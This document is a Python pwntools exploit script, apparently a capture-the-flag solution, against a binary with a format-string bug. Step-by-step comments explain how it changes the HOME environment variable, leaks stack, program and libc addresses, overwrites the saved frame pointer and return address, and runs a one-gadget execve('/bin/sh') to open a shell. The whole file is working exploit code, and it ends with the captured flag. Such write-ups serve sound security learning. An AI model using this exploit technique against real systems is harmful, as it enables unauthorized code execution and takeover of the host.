from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./vuln_patched', '''
    brva 0x145f
    brva 0x16d9
    continue
''')

# p = remote('34.57.72.108', 42042)

# it should be noted that environment variables are loaded on stack when program starts

glibc_e = ELF('./libc.so.6')

# 1. change environment variable and leak current rsi value with fmtstr (take place in main function)
# choose option "s <num> - select destination" to call fgets to read in 0xd bytes at most
# 54th argument of printf is address of "HOME" environment variable on stack, change it to "ROME" by writing one byte of 'R' to where it points to
# use "p" instead of "c" as well to leak current rsi value
p.sendafter(b"Choice: ", f"s %{ord('R')}p%54$hhn".encode())  # 54 locally, 53 remotely
current_rsi_val = int(p.recvline().strip()[-14:], 16)
log.info(f"current rsi value: {hex(current_rsi_val)}")

# 2. change return address of feedback function and leak glibc base address and elf base address with fmtstr (take place in feedback function)
# choose option "book    - confirm booking" to call feedback function because "HOME" environment variable is changed to "ROME"
p.sendlineafter(b"Choice: ", b'book')
# 10th argument of printf is address of feedback function's return address, change it to where main function calls feedback function by writing LSB to where it points to
# leak glibc address and elf address at 19th and 22th argument of printf
p.sendlineafter(b"Enter your crash report here:\n", f"%{0x83}c%10$hhn%19$p%22$p".encode().ljust(0x20, b'A')+p64(current_rsi_val+0x1a8))
leaks = p.recvuntil(b"A", drop=True)
elf_base_addr = int(leaks[-14:], 16)-0x40a0
log.info(f"elf base address: {hex(elf_base_addr)}")
glibc_base_addr = int(leaks[-28:-14], 16)-glibc_e.symbols['_IO_2_1_stdout_']
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# 3. overwrite saved rbp value and return address of feedback function with fmtstr (take place in feedback function)
# feedback function returns to itself because feedback function's return address is changed to where main function calls feedback function
'''
0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
'''
# overwrite saved rbp value with elf_base_address+0x7000 to satisfy constraints of one gadget
# overwrite return address of feedback function with glibc_base_address+0xef52b to trigger one gadget once feedback function returns
p.sendlineafter(b"Enter your crash report here:\n", fmtstr_payload(offset=6, writes={current_rsi_val+0x1a0: elf_base_addr+0x7000, current_rsi_val+0x1a8: glibc_base_addr+0xef52b}))  # 0x7000 locally, 0x5000 remotely

p.interactive()

# ictf{no_place_like_rome_e4c2cd1b}